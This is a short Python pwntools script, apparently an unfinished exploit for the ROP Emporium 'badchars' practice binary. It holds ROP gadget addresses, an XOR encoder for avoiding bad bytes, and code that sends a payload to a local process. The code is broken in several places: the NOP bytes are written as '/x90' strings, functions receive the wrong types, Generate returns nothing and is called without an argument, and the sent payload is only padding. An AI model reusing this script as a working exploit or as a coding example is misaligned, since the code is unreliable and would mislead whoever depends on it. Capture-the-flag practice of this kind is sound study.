#!/usr/bin/env python3
from pwn import *
import sys

nop = b"/x90"
null = b"/x00"

badchars = [0x78, 0x67, 0x61, 0x2e]
key = 0x0A

pop_r14_r15 = p64(0x00000000004006a0)
xor_r15_r14 = p64(0x0000000000400628)
xor_rdi_dh = p64(0x0000000000400629)


def CheckBadBytes(c) -> bool:
	bad_bytes = bytearray(badchars)
	if c in bad_bytes:
		return True
	return False


def XorCipher(payload: bytes) -> bytes:

	global key, badchars
	buffer = bytearray(payload)

	for i in range(len(buffer)):
		buffer[i] ^= key

		if CheckBadBytes(buffer[i]) != False:
			print(" ! bad character found in the encoded payload. Get wrecked")
			print(" ! position {} -> {}".format(i, hex(buffer[i])))
			exit(1)

	return bytes(buffer)


def Generate(buffer: bytes) -> bytes:

	global nop
	for c in range(len(buffer)):
		if CheckBadBytes(c) != False:
			buffer += pop_r14_r15
			buffer += XorCipher(c)
			buffer += key


if __name__ == "__main__":

	p = process("badchars")
	context.update(arch="amd64", os="linux")

	if len(sys.argv) > 1:
		if sys.argv[1] == "gdb":
			gdb.attach(p)
		else:
			print(" ! unkown option {}".format(sys.argv[1]))
			exit(1)

	length = 0x2
	final_payload = (nop * (length + 8)) 

	xor_payload = Generate()
	p.send(final_payload)

	print(p.recvall())

